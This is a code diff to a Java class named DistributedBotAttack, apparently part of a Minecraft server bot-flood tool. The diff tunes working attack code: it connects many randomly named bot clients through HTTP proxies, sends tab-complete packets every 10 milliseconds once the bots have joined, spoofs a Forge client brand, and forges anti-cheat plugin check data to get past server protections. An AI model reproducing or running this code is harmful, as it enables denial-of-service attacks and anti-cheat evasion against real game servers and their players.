@@ -55,7 +55,7 @@ public class DistributedBotAttack extends IAttack {
 				try {
 					cleanClients();
 					createClients(ip,port);
-					Utils.sleep(5000);
+					Utils.sleep(10*1000);
 					
 					if(this.attack_time>0&&(System.currentTimeMillis()-this.starttime)/1000>this.attack_time) {
 						clients.forEach(c->{
@@ -77,11 +77,14 @@ public class DistributedBotAttack extends IAttack {
 					synchronized (clients) {
 						clients.forEach(c->{
 							if(c.getSession().isConnected()) {
-								c.getSession().send(new ClientTabCompletePacket("/"));
+								Object isjoin=c.getSession().getFlag("join");
+								if(isjoin!=null&&((boolean)isjoin)==true) {
+									c.getSession().send(new ClientTabCompletePacket("/"));
+								}
 							}
 						});
 					}
-					Utils.sleep(200);
+					Utils.sleep(10);
 				}
 			});
 		}
@@ -117,7 +120,8 @@ public class DistributedBotAttack extends IAttack {
 					String[] _p=p.split(":");
 					Proxy proxy=new Proxy(Proxy.Type.HTTP,new InetSocketAddress(_p[0],Integer.parseInt(_p[1])));
 					Client client=createClient(ip, port,Utils.getRandomString(4,12),proxy);
-					client.getSession().setCompressionThreshold(0);
+					client.getSession().setReadTimeout(10*1000);
+					client.getSession().setWriteTimeout(10*1000);
 					synchronized (clients) {
 						clients.add(client);
 					}
@@ -127,7 +131,7 @@ public class DistributedBotAttack extends IAttack {
 						client.getSession().connect();
 					});
 					
-					if(this.attack_maxconnect>0&&clients.size()>this.attack_maxconnect) return;
+					if(this.attack_maxconnect>0&&(clients.size()>this.attack_maxconnect)) return;
 					if(this.attack_joinsleep>0) Utils.sleep(attack_joinsleep);
 				}catch(Exception e){
 					Utils.log("BotThread/CreateClients",e.getMessage());
@@ -150,9 +154,13 @@ public class DistributedBotAttack extends IAttack {
 							byte[] checkData=acp.getCheckData("AntiCheat.jar",code,new String[] {"44f6bc86a41fa0555784c255e3174260"});
 							e.getSession().send(new ClientPluginMessagePacket("AntiCheat3.4.3",checkData));
 							break;
+						case "MC|Brand":
+							e.getSession().send(new ClientPluginMessagePacket("MC|Brand","fml,forge".getBytes()));
+							break;
 						default:
  					}
 				}else if (e.getPacket() instanceof ServerJoinGamePacket) {
+					e.getSession().setFlag("join",true);
 					Utils.log("Client","[连接成功]["+username+"]");
 				}
 			}
